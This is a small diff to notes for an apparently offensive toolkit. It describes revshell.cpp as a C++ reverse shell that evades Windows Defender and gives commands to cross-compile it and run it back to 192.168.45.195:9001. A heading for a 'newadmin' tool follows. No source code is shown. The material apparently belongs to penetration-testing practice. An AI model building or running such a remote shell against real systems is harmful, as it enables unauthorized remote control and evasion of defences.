@@ -1,6 +1,6 @@
 ### revshell.cpp
 Simple C++ reverse shell, can be used to bypass Windows Defender if we want to get a simple reverse shell from the target.
-- Compile in linux with: `x86_64-w64-mingw32-g++ -o reverse_shell.exe reverse_shell.cpp -lws2_32 -static-libgcc -static-libstdc++`
+- Compile in linux with: `x86_64-w64-mingw32-g++ -o rev.exe rev.cpp -lws2_32 -static-libgcc -static-libstdc++`
 - Execute: `rev.exe 192.168.45.195 9001`
 
 ### newadmin.cpp
